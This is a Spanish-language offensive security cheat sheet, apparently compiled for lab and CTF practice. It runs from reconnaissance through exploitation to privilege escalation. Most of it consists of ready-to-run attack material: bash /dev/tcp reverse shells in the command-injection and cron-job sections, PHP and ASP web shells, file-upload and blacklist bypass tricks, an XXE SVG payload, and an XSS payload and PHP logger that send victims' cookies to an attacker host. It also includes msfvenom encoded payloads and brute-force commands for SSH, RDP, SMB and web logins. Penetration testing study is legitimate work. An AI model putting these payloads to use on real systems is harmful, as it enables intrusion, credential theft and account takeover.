TRANSFERENCIA DE ARCHIVOS  
..........................

sudo python3 -m http.server 8080
sudo python3 -m SimpleHTTPServer 80

INSTALAR REQUIREMENTS PYTHON
............................

cat requirements.txt | xargs sudo apt install -y

python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements

deactivate => con eso finalizamos el entorno virtual

TRATAMIENTO TTY
...............

Primero probar si funciona bash

LINUX
.....
   ------ option 1 -------
   script /dev/null -c bash
   ctrl+z
   stty raw -echo; fg
   reset xterm
   export TERM=xterm
   export SHELL=bash
   stty rows 52 columns 180

   ------ option 2 -------
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=screen-256color
   [Ctrl + z]
   echo $TERM
   stty raw -echo
   fg
   [INTRO]

   stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

   script -q /dev/null -c bash
   /usr/bin/script -qc /bin/bash /dev/null

WINDOWS
.......

https://github.com/antonioCoco/ConPtyShell

ENUMERACION
...........

      DESCUBRIMIENTO DE HOSTS
      .......................
            
            arp-scan -I [interfaz] [rango IP] -g --> más recomendado!

            fping -a -g {Rango de IP}
                  -a: Este argumento indica que muestre solamente las ips que están activas en la red.
                  -g: Este argumento especifica que vamos a hacer el ping a un rango de ip.
         
            nmap -sn {Rango de IP}
                  -sn Este argumento indica a nmap que realice un escaneo de ping al rango de ip indicado.

            netdiscover -r {Rango de IP}
                  -r Este argumento indica que se va escanear un rango de ip.

     DESCUBRIMIENTO DE PUERTOS
     .........................

            sudo nmap -sS --min-rate 5000 -p- --open {IPs ej: 10.0.2.43,45,46...} -oN tcp_scan.txt
                   -sS Este argumento hace un escaneo SYN (no completa la conexion)
                   --min-rate Este argumento acelera el escaneo
                   -p- Este argumento escanea todos los puertos  
                   --open Este argumento muestra solo puertos abiertos
                   -oN Este argumento es para darle salida al escaneo en un archivo

            nmap -p22,80,443,445,... -sC -sV --open {IPs ej: 10.0.2.43,45,46...} -Pn -oN full_scan.txt
                   -sC: Indica que utilice unos scripts básicos de reconocimiento contra la IP.
                   -sV: Indica que muestre la versión que está funcionando en los puertos encontrados.
                   -Pn Indica que ignore la detección de host. Es útil cuando el host está filtrando o bloqueando el trafico ICMP. 

      ENUMERACION WEB
      ...............

            TIPS
            ....
            crtl+u => ver codigo fuente de la web

            Si la url no carga hay que añadir la referencia DNS en /etc/hosts/ hay varias formas:
               sudo nano /etc/hosts => añadir referencia DNS ej: 10.10.10.10    blog.thm
               sudo sh -c 'echo "10.10.10.10  academy.htb" >> /etc/hosts'
               echo "10.10.10.10  academy.htb" | sudo tee -a /etc/hosts

            DNS
               dig axfr [dominio]
               nslookup

            HERRAMIENTAS
            ............

            whatweb -v http://url.com

            sslscan <ip> => permitirá anilizar el protocolo SSL/TLS que tiene configurado

            openssl s_client -connect [dominio]:443 --> ver certificados SSL

            WFUZZ
            .....
            wfuzz -c -t 400 --hc=404 -w [wordlist] [url]/FUZZ
            wfuzz -c -t 400 --hc=404 -w [wordlist] -w [archivo_extensiones] [url]/FUZZ.FUZ2Z
            wfuzz -c -t 400 --hc=404 -z range,0-100 http://IP/note.php?note=FUZZ --> probar numeros del 0 al 100

            FFUF
            ....

            Enumerar directorios con ffuf:
               ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.252.13:39937/FUZZ
            Enumerar extensiones con ffuf:
               ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
            Enumerar paginas con ffuf:
               ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php 
            Enumeracion recursiva y mas profunda con ffuf:
               ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
            Enumeracion de subdominios con ffuf:
               ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb/
            Enumerar filtrando los resultados en este ejemplo por tamaño de respuesta:
               ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:36574/ -H 'Host: FUZZ.academy.htb' -fs 986
            Enumerar parametros
               ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:50526/admin/admin.php?FUZZ=key -fs 798
               ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx => Para peticiones POST
            Enumerar valores
               ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://vhost.academy.htb:PORT/directory/page.ext -X POST -d "parameter=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs xxx
                  curl http://vhost.academy.htb:PORT/directorio/página.ext -X POST -d "parámetro=valor" -H "Tipo de contenido: aplicación/x-www-form-urlencoded" => Para descargar la pagina
               ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
                  Creamos ids.txt con valores de 1 a 1000
                     for i in $(seq 1 1000); do echo $i >> ids.txt; done
                        
            Otras enumeraciones con ffuf: 
               ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> Searching for LFI
               ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" --> Username enumeration with ffuf
               ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "host:FUZZ.empline.thm" -u 'http://empline.thm/' -fs 14058 --> escaneo de subdominios

            dirb http://IP /path/to/wordlist

            dirsearch -u http://[IP]/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f
            dirb http://[IP]/ -u user:password => Si para acceder al sitio web salta un cuadro emergente pidiendo credenciales y las conocemos, para fuzzear esa parte a la que accedemos despues del login:

            DIRBUSTER
                  1 - Poner target: http://10.10.10.10
                  2 - Poner Diccionario: /usr/share/wordlists/dirbuster/directory-list/lowercase-2-3-medium.txt

            gobuster dir -u "ip" -w /usr/share/wordlist/rockyou.txt -t 30
                  -u: Este argumento indica la IP/URL a analizar.
                  -w: Este argumento indica el directorio donde se encuentra el diccionario.
                  -t: Este argumento indica los hilos a los que se va a hacer el descubrimiento. Mientras más hilos, más ruido creas en la red y menos preciso es el escaneo
            gobuster -u "ip" -w /usr/share/wordlist/rockyou.txt -t 30 -x .txt,.php.js
                  -x: Este argumento indica las extensiones que se quieren analizar.
            gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt => Enumera Subdominios DNS


            wpscan --url http://web.com/carpeta => escaneo de web "wordpress" con plugins incluidos y versiones  

            joomscan -u [URL]
            https://github.com/SamJoan/droopescan

            magescan.phar scan:all [URL]
            https://github.com/steverobbins/magescan

            zaaproxy

            burpsuite  


      PUERTO 80
      .........

            1 - Revisa toda la página y el código fuente.
            2 - Lee cada página, revisa posibles emails, usuarios, información, etc.
            3 - Una vez encontrada la versión del sistema, busca en Google información acerca del servicio, busca exploits, CVEs, cualquier información que te permita determinar si la versión es vulnerable.
            4 - Utiliza whatweb o Wappalyzer para encontrar información sobre la aplicación web.
            5 - Realiza descubrimiento de directorios y de archivos.

      BUSCAR VULNERABILIDADES
      .......................

            nikto --url http://web.com => Para vulenerabilidades WEB
            nikto -h scanme.nmap.org
            nikto -h https://nmap.org -ssl --> Si la web va por HTTPS
            nikto -h $TARGET -T 9 -Format txt -o scans/$TARGET-nikto-80-sqli --> Escanea en busca de vulnerabilidades SQLi

            nmap --script=servicio -p"Puerto" <IP> => Ej: nmap --script=ftp -p21 10.10.10.10

EXPLOTACION
...........

      PUERTO 445/SMB
      ..............

            LISTAR RECURSOS COMPARTIDOS
            ...........................

                  smbclient -L 10.10.10.10 -N
                        -L: Mostrar por consola los recursos compartidos.
                        -N: Nullsession
                  Para conectarse:
                        smbclient //IP/RECURSO -n                  
                        smbclient //10.10.10.10/directorio -U user => Acceso a carpeta si tenemos usuario y contraseña
                  Una vez dentro para descargar:
                        smb:\> => get: descarga un documento / mget: descarga todos los documentos
                        smbget -R smb://IP/recurso
                        prompt off

                  enum4linux 10.10.10.10 
                  enum4linux -a <IP address>

                  smbmap -H 10.10.10.10 => Enumerar carpetas Nullsession
                  smbmap -H 10.10.10.10 -u user -p password => Acceder carpetas si tenemos usuario y contraseña

                  crackmapexec smb 10.10.10.10 -u ' ' -p ' ' --shares => buscamos carpetas de nullsession
                        dejamos 1 espacio entre comillas simples para nullsession
                        -u: Usuario
                        -p: Password 
                  crackmapexec smb 10.10.10.10 -u 'user' -p 'password.txt' => ataque de diccionario a un usuario determinado
               
                  hydra -l usuario -P lista.txt smb://IP -t 4
                        Ej: hydra -l administrador -P passwords.txt smb://192.168.1.150 -t 4

      EXPLOTACION WEB
      ...............

            FUERZA BRUTA WEB
            ................

                  wpscan -U admin -P /usr/share/wordlist/rockyou.txt --url http://web.com/carpeta => ataque de diccionario al panel de login de wordpress
                     
                  hydra -l usuario -P lista.txt http-get://IP/ruta -t 4 => ataque basico http 
                        Ej: hydra -l user -P passwords.txt 127.0.0.1 http-get / -s 81 
                  hydra -l usuario -P lista.txt IP http-post-form "/ruta:campo_usuario=^USER^&campo_password=^PASS^:Falla" => Ataque web con formulario login
                        Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' --> Panel wordpress que no muestra error y redirecciona
                  hydra -L user.txt -P rockyou.txt <IP> http-post-form "[URL]:[TOKEN-URL]:Login failed"
                        Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low:F=Username and/or password incorrect' 
                        Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
                           Flag Mayuscula = Lista palabras
                           Flag Minuscula = sabemos usuario o contraseña

                  Burpsuite
                     1 - Interceptar peticion
                     2 - Mandar al intruder   
                     3 - Seleccionar Payloads: Usuario o contraseña o los dos
                     4 - Elegir tipo de ataque   
                           Sniper attack: si conocemos usuario o contraseña
                           Cluster bomb attack: si no conocemos ni usuario ni contraseña
                     5 - Cargar lista de usuarios y contraseñas
                     6 - Start Attack

            COMMAND INJECTION
            .................

                  SENCILLO
                  ........

                     1 - Probar en la barra de busqueda el resultado esperado + ; o && o | + Comando
                     2 - Si se ejecutan comandos existe vulnerabilidad
                     3 - Poner en escucha el kali 
                           nc -lvnp 4444
                     4 - Poner en el buscador el valor esperado + revershell
                           bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
                     5 - Debe conectarse, si no probar sh, perl, o cualquier otra shell

                  BYPASS BLACKLISTED 1 CHARACTER
                  ..............................

                     1 - Interceptamos con burpsuite
                     2 - Enviamos a repeater
                     3 - Probamos characteres normales
                     4 - Si no funciona probamos %0a + comando
                     5 - Si no funciona añadimos %0a%09 => %09 equivale a tabulacion
                     6 - Probar si no %0a${IFS}
                     7 - Probar %0a{ls,-la}
                        
                     Podemos añadir caracteres como ; / 
                        echo ${PATH} => /usr/local/bin:/usr/bin:/bin:/usr/games
                        ${PATH:0:1} => indica 0 donde inicia y el 1 numero de caracteres => Esto seria /
                        ${IFS} => espacio 
                        printenv => comando para ver todas las variables

                           ${LS_COLORS:10:1} => ;
                           ${PATH:0:1} => /
                           %0a => \n => new-line
                           ${IFS} => espacio
                           %09 => tabulacion

                  BYPASS BLACKLISTED COMMAND
                  ..........................

                     1 - Linux y Windows: Podemos ofuscar comandos usando ' o " => ej: w"h"o"am"i
                     2 - Linux podemos usar \ => w\ho\am\i
                     3 - Windows podemos usar ^ => who^ami
                    
                  OFUSCACION AVANZADA
                  ...................

                     1 - Servidor Windows => no distingue mayusculas y minusculas 
                           Ofuscacion: WhOaMi  
                     2 - Servido Linux => disntiguen mayusculas pero podemos ofuscar con tr(convierte en minusculas)
                           ej: (tr "[A-Z]" "[a-z]"<<<"WhOaMi")
                     3 - Podemos escribir el comando leyendolo al reves => $(rev<<<'tac')
                     4 - Podemos codificar el comando   
                           echo -n 'cat /etc/passwd | grep 33' | base64 => Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
                           bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

                  HERRAMIENTAS OFUSCACION
                  .......................

                     1 - Bashfuscator => ofuscador de comandos Linux
                           git clone https://github.com/Bashfuscator/Bashfuscator
                           cd Bashfuscator
                           pip3 install setuptools==65
                           python3 setup.py install --user
                     2 - DOSfuscation => osfuscador de comandos windows


            CSRF/CROSS SITE REQUEST FORGERY
            ...............................
                  
                  -  Esta vulnerabilidad aprovecha el cambio de contraseña. En la url aparece usuario y contraseña.  
                  -  El link se acorta y se envia a la victima
                  
            FILE INCLUSION
            ..............
   
                  - Si vemos /?page= y acaba en .php es posible que exista la vulnerabilidad
                  - Probar /etc/passwd => esto muestra los usuarios 
                           si no funciona poner /../../../../
                  - Si muestra el contenido es vulnerable
                           - Las webs se almacena en:
                              - LINUX: /var/www/
                              - WINDOWS: C:/inetpub/www
                  - <?php system($_GET['cmd']); ?> => Codio PHP para ejecutar shell 

                  Se explota subiendo una reverse-shell.php se hace asi:

                  1 - Buscas una en internet ej: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
                  2 - Copias el codigo y creas un archivo 
                           sudo nano reverse.php => pegas el codigo copiado
                  3 - Cambias los parametros IP y PUERTO => pones IP de nuestra KALI y el puerto configurado
                  4 - Damos permisos de ejecucion
                           sudo chmod -x reverse.php
                  5 - Creamos un servidor para subir el archivo
                           python3 -m http.server 8080
                  6 - Ponemos en escucha nuestro KALI
                           nc -lvnp 4444
                  6 - Ponemos la direccion de mi servidor KALI en la url 
                           http://10.10.231.229/vulnerabilities/fi/?page=http//IPKALI:8080/reverse.php

                              
            FILE UPLOAD
            ...........

                  Esta vulnerabilidad consiste en subir un archivo que ejecute comandos o incluso una reverse shell camuflada en un archivo esperado ej: .jpg .png etc

                  1 - Crea el archivo con el codigo modificado y en formato .php
                  2 - Pon la maquina atacante en escucha =>            3 - Sube el archivo PHP a la victima y visitalo
                  4 - Recibe el acceso remoto en tu terminal Netcat

                  - Forma facil te deja directamente subir un archivo cualquiera. Ej: reverse.php => contiene una reverse shell
                  - Forma normal => se debe camuflar el archivo en lo esperado. Se hace asi:   
                        1 - Burpsuite => abrimos y configuramos para interceptar
                        2 - Subimos el archivo reverse.php e Interceptamos peticion
                        3 - Hay dos opcines posibles:
                              Cambiamos cabecera si el archivo es reverse.php
                                 -Content-type: image/png
                              Cambiamos extension si es reverse.jpg => esta camuflado la reverse
                        4 - Hacer fuzzing para buscar la carpeta upload y ejecutar la reverse shell

                 
                  CREACION ARCHIVO .PHP
                  .....................
                        sudo nano prueba.php => dentro incluimos el codigo de la reverse shell o comandos que necesitemos usar
                           Ej:   <?php
                                 system('comando');
                                 ?>
                  FORZAR SUBIDA FORMATOS
                  ......................
                  <input name="uploadFile" id="uploadFile" type="file" class="custom-file-input" id="inputGroupFile02" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
                  <label id="inputGroupFile01" class="custom-file-label" for="inputGroupFile02" aria-describeby="inputGroupFileAddon02">

                  Eliminar el onchange y el accept asi podemos cargar el archivo que queramos

                  WEB SHELL
                  .........
                        <?php file_get_contents('/etc/passwd'); ?>          => Lectura básica de archivos PHP
                        <?php system('hostname'); ?>                        => Ejecución básica de comandos PHP
                        <?php echo file_get_contents('/etc/hostname'); ?>   => Script PHP que se ejecuta para obtener el (nombre de host) en el servidor back-end
                        <?php system($_REQUEST['cmd']); ?>                  => PHP Web Shell básico
                        <?php echo shell_exec($_GET[ "cmd" ]); ?>           => Webshell PHP alternativo que utiliza la función shell_exec.
                        <% eval request('cmd') %>                           => Shell web ASP básico

                        CODIGO PARA OCULTAR EN .SVG
                        ...........................
                        1 - Este sirve para ver el codigo de upload.php

                           <?xml version="1.0" encoding="UTF-8"?>
                           <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
                           <svg>&xxe;</svg>

                        2 - Este sirve para ejecutar comandos, AAAA se puede enmascarar cambiando el hexadecimal ej: jpeg => FF D8 FF DB

                           AAAA
                           <?php echo system($_GET["cmd"]);?

                        Para meter comandos si necesitamos poner espacio en url %20 => Espacio

                  BLACKLIST FILTER
                  ................

                        Puede ser que haya extensiones en blacklist, para probar que extensiones son validas:
                           1 - Creo shell.jpg (formato que admita el campo) shell => <?php system($_REQUEST['cmd']); ?>
                           2 - Intercepto con Burp
                           3 - Envio intruder y selecciono la extension
                           4 - Añado una lista de seclist => /SecLists/Discovery/Web-Content/web-extensions.txt
                           5 - Me dirijo al lugar de subida del archivo => Ej: http://83.136.249.46:40526/profile_images/shell2.phar?cmd=id
                           6 - Pruebo extensiones validas que ejecuten el comando

                        A veces se necesita algo mas para evadir los filtros hay que poner dos extensiones: shell.php.jpg / shell.jpg.php / shell.jpg.phar / shell.jpg.phtml
                        Tambien Escribir GIF8 delante del codigo shell. 
                      
                             
            SQL INJENCTION
            ..............
                  
                  Estructura Base de datos => BASE DE DATOS > TABLAS > COLUMNAS > CAMPOS > VALOR

                  Probamos si es Vulnerable con => ' o 'or '1'='1 => Si es vulnerable:

                  1 - Abrimos Burpsuite > configuramos > hacemos consulta 
                  2 - Guardamos consulta.req
                  3 - Lanzamos comando sqlmap
                        sqlmap -r consulta.req -p id --batch --dbs
                  4 - Si detecta las bases de datos vamos profundizando:
                        sqlmap -r consulta.rez -p id -D <base de datos> --tables
                        sqlmap -r consulta.rez -p id -D <base de datos> -T <Tabla> --columns
                        sqlmap -r consulta.rez -p id -D-D <base de datos> -T <Tabla> -C <Columna,Columna2...> --dump
                  5 - Podemos crackear los hashes con john siguiendo los pasos de sqlmap

                  Otros escaneos SQLmap
                     - Ver toda la estructura de la BD
                        sqlmap -r consulta.req --schema
                     - Buscar palabra clave en Tablas
                        sqlmap -r consulta.req --search -T user
                     - Buscar palabra claven e Columnas
                        sqlmap -r consulta.req --search -C pass
                     - Descifrar passwords
                        sqlmap -r consulta.rez --passwords --batch

               
            XSS/CROSS SITE SCRIPTING => Vulnerabilidad que acepta la entrada de codigo javascript
            ........................

                  REFLECTED => se muestra 1 vez el script sin almacenarse
                  STORED => se queda almacenado y todo el que visite puede ejecutarlo ej: entrada blog
                  
                      Probamos un script ej: <script>alert("HAS SIDO HACKEADO")</script>

                  SESSION HIJACKING
                  .................

                     1 - Creamos un directorio temporal
                           mkdir /tmp/tmpserver
                           cd /tmp/tmpserver
                     2 - Crea archivo index.php con el siguiente codigo:      
                           <?php
                           if (isset($_GET['c'])) {
                               $list = explode(";", $_GET['c']);
                               foreach ($list as $key => $value) {
                                   $cookie = urldecode($value);
                                   $file = fopen("cookies.txt", "a+");
                                   fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
                                   fclose($file);
                               }
                           }
                           ?>
                     3 - Crea archivo script.js con el siguiente codigo
                           new Image().src='http://OUR_IP:8080/index.php?c='+document.cookie
                     4 - Pon tu maquina en escuchas
                           nc -lnvp 8080
                     5 - Prueba los campos con el payload
                           "><script src=http://OUR_IP:8080/script.js></script>
                     6 - Recibe el archivo cookie.txt con la coockie
                     7 - Pon la cookie en tu navegador 
                           Inspect > storage > pega cookie > refresca
                                 
      BUSCAR EXPLOIT
      ..............

            searchsploit wordpress mail masta 
            searchsploit -x <path>

      ENCODEAR PAYLOAD
      ................

            www.revshells.com => para generar comandos msfvenom
            msfvenom -p "payload" LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port) -e x86/shikata-ga-nai -f exe > encoded.exe

      METASPLOIT
      ..........

            show => listar exploit, payload, auxiliary
            search => buscar exploit, payload, vulnerabilidad, etc
            use => seleccionar lo que queremos usar, ruta o numero
            show info => mostrar informacion de lo seleccinado
            set => configurar opcion
            setg => configurar globalmente la opcion durante la session
            run o exploit => activar el exploti o auxiliary

      PONER MI PC EN ESCUCHA
      ......................

            nc -lvnp 443

      CREAR DICCIONARIOS
      ..................

            crunch <min-len> <max-len> [<charset string>] [options] => Generacion de Contraseñas

            cupp -i => hara preguntas vamos rellenando con lo que tengamos
               Instalacion: sudo apt install cupp -y

            Username Anarchy => Crea nombres de usuario. Es necesario tener instalado Ruby
               Ej: ./username-anarchy Jane Smith > jane_smith_usernames.txt
                     Instalar Ruby:
                           sudo apt install ruby -y
                           git clone https://github.com/urbanadventurer/username-anarchy.git
                           cd username-anarchy

            Filtrar diccionarios: 
               Ej: grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
                        Debe incluir:
                              Longitud mínima: 6 caracteres => grep -E '^.{6,}$'
                              Al menos una letra mayúscula => grep -E '[A-Z]'
                              Al menos una letra minúscula => grep -E '[a-z]'
                              Al menos un número => grep -E '[0-9]'
                              Al menos dos caracteres especiales (del conjunto !@#$%^&*) => grep -E '([!@#$%^&*].*){2,}'

      CRACKEAR HASHES
      ...............

            https://hashes.com/en/decrypt/hash
            https://hashcat.net/wiki/doku.php?id=example_hashes

            2john id_rsa > hashes.txt => Pasar un id_rsa a hash para crackear el hash

            john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
            sudo john --format=[format] --wordlist=[path to wordlist] [path to file]
            john --list=formats => ver cifrados que admite john
            Borrar logs john --> rm ~/.john/john.*

            Si queremos juntar /etc/passwd y /etc/shadow para luego crackear...
                 unshadow passwd.txt shadow.txt > unshadow.txt
                 john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt

                  
            hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
                  -m => tipo de hash
                  https://hashcat.net/wiki/doku.php?id=hashcat => flags de hashcat

     RDP
     ...

      xfreerdp /v:[IP] -sec-nla /u:"" -- Recon
      xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
      xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard

      rdesktop <RHOST>

      ncrack -vv --user user -P wordlist.txt [IP]:3389 -- Try cracking rdp login

      hydra -l usuario -P lista.txt rdp://IP -t 4
         Ej: hydra -l Administrator -P rockyou.txt rdp://192.168.1.50 -t 4

      crowbar -b rdp -u user -C password_wordlist -s [IP] -v -- Other method to try cracking

      SSH
      ...   

         hydra -l usuario -P lista_de_contraseñas.txt ssh://IP -t 4
            Ej: hydra -l root -P passwords.txt ssh://192.168.1.100 -t 4

         medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
                     -h: Especifica la dirección IP del sistema de destino.
                     -n: Define el puerto en el que el servicio SSH está escuchando (normalmente el puerto 22).
                     -u: Establece el nombre de usuario para el ataque de fuerza bruta.
                     -P: Le indica a Medusa una lista de palabras 
                     -M: Selecciona el módulo SSH dentro de Medusa, adaptando el ataque específicamente para la autenticación SSH.
                     -t: Determina el número de intentos de inicio de sesión paralelos que se ejecutan simultáneamente. Aumentar este número puede acelerar el ataque, pero también puede aumentar la probabilidad de detección o la activación de medidas de seguridad en el sistema objetivo.

         ssh sshuser@<IP> -p PORT => Este comando iniciará una sesión SSH interactiva
         ssh root@10.10.10.10 -i id_rsa => Acceder con id_rsa
         
      FTP   
      ...   

         hydra -l usuario -P lista.txt ftp://IP -t 4
            Ej: hydra -l anonymous -P passwords.txt ftp://192.168.1.20 -t 4

         medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

         ftp ftp://USER:<PASSWORD>@<IP>
         ftp ftp://USER@IP => si da problemas la password acceder asi y poner password cuando la pida. 

      MySQL
      .....

         hydra -l usuario -P lista.txt mysql://IP -t 4
            Ej: hydra -l root -P passwords.txt mysql://192.168.1.100 -t 4
         hydra -l usuario -P lista.txt postgres://IP -t 4

POSTEXPLOTACION
...............

   ENUMERAR SISTEMA
   ................

      MANUAL
      ......

            LINUX
            .....
      
               whoami              => averiguar usuario que soy
               hostname            => averiguar nombre del host
               uname - a           => saber la version del kernel
               cat /proc/version   => ver la version del kernel
               cat /etc/passwd     => ver los usuarios
               ifconfig            => ver ip y tarjetas de red por si hay otra red y pivotar
               sudo -l             => muestra los comando que se pueden usar con sudo
               netstat             => servicios que corren
               ps -ef              => procesos que corren
               env                 => variables de entorno
               id                  => ver el id de usuario
               cat /etc/crontab    => almacen de tareas programadas
         
               find / perm -u=s -type f 2>/dev/null    => Busca comandos vulnerables para añadir permisos
               getcap -r / 2>/dev/null                 => 

            WINDDOWS
            ........
                  
               hostname                            => nombre del host
               whoami                              => nombre del usuario
               whoami /priv                        => igual que sudo -l ver que permisos tenemos en la maquina
               syteminfo                           => ver que parches tiene la maquina windows, ver el kernel
               ipconfig                            => ver la ip y tarjetas de red
               cmdkey /list                        => ver las credenciales guardadas
               icacls <ruta>                       => ver permisos que tenemos en esa ruta
               sc query windefend                  => 
               sc queryex type=service             =>
               netsh advfirewall firewall dump     => dumpear si tiene antivirus o firewall
               schtasks /query /fo LIST /v         => ver las tareas programadas
               reg /query                          => 
               Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections =>


      AUTOMATICO
      ..........

         LinPeas => Automatiza la enumeracion en Linux y Mac
         WinPeas => Automatiza la enumeracion en Windows
         MacPeas => en deshuso, ahora se usa LinPeas

         Para usarlo en linux:
            1 - Creamos servidor en maquina atacante en la carpeta de LinPeas /usr/share/peass/linpeas
                  python3 -m http.server 8080
            2 - Normalmente en target nos vamos a cd /tmp para descargar LinPeas
                  wget http://<IP ATACANTE>:8080/linpeas.sh => en linux               
            3 - Damos permiso ejecucion
                  chmod +x linpeas.sh
            4 - Ejecutamos
                  ./linpeas.sh

         Para usarlo en windows:

            1 - Creamos servidor en maquina atacante
                  python3 -m http.server 8080
            2 - Buscamos una carpeta que podamos escribir y descargamos WinPeas
                  curl -O http://IP ATACANTE:8080/winPEASany_ofs.exe
            3 - Ejecutamos el .exe
                  /winPEASany_ofs.exe
      

   ESCALAR PRIVILEGIOS
   ...................

      LINUX
      .....

            OPCION SENCILLA
            ...............
         
                  Ej Vulnerabilidad Kernel
                     1 - Buscamos exploit en google o searchsploit
                     2 - Copiamos exploit => searchsploit -m PATH o creamos archivo y copiamos codigo
                     3 - Subimos exploit a target => Igual que LinPeas.sh creando servidor
                     4 - Ejecutamos exploit => ./exploit
         
                  Compilar => gcc 37292.c -o exploit
      
            TECNICA SUDO
            ............
      
                  1 - sudo -l => Para ver que comandos son vulnerables
                  2 - visitar => gtfobins.github.io
                  3 - Filtro por sudo y busco comando vulnerable ej: find
                  4 - Copiamos el comando y lo ejecutamos
                  5 - Escalamos a root
      
            TECNICA SUID
            ............
      
                  Añadimos permisos SUID a un comando
                  1 - Buscamos Comandos Vulnerables
                        find / -perm -u=s -type f 2>/dev/null
                  2 - visitar => gtfobins.github.io
                  3 - Filtramos por SUID
                  4 - Buscamos el comando vulnerable
                  5 - Ejecutamos el codigo que nos da
      
                  Dar permisos SUID 
                     chmod 4755 /usr/bin/find
      
                  IMPORTANTE:  Adquirimos permisos del propietario del archivo puede ser root u otro usuario

            TECNICA CRON JOBS
            .................

                  Es una vulnerabilidad de las tareas programadas con root
                     1 - Vemos las tareas programadas 
                           cat /etc/crontab
                     2 - Buscamos en los archivos programados que tengamos permisos para modificarlos
                     3 - Modificamos el archivo y escribimos una reverse shell para que lo ejecute cuando toque la tarea
                           bash -i >& /dev/tcp/IP ATACANTE/PUERTO 0>&1
                     4 - Poner en escucha nuestra maquina atacante y esperar que la tarea se ejecute automaticamente
                           nc -lnvp PUERTO
                     5 - Nos devuelve una reverse shell en root

            CAPABILITIES (Persistencia)
            ..........................

                  No es una escalada de privilegios, es una manera de persistencia para convertirte en root. Para poder ponerla capabilitie tienes que ser root previamente. 
                     1 - Buscamos Capabilities en gtfobins => python o php son las mas comunes
                     2 - Usamos los comandos que nos da gtfobins => como ROOT 
                           sudo setcap cap_setuid+ep python
                              * SI NO FUNCIONA: readlink -f /usr/bin/python3
                                                setcap cap_setuid+ep /usr/bin/python3.8
                     3 - Para usar la capabiliti estando como USER ejecutamos el segundo comando de gtfobins
                           ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
                     4 - Escalamos y somos ROOT

      WINDOWS
      .......

            SERVICE EXPLOIT : INSECURE SERVICE PERMISSIONS
            ..............................................

                  Debemos tener instalado las herramientas Sysinternals para poder usar accesschk.exe y comprobar si es vulnerable => WinPeas Tambien detecta la vulnerabilidad
                 
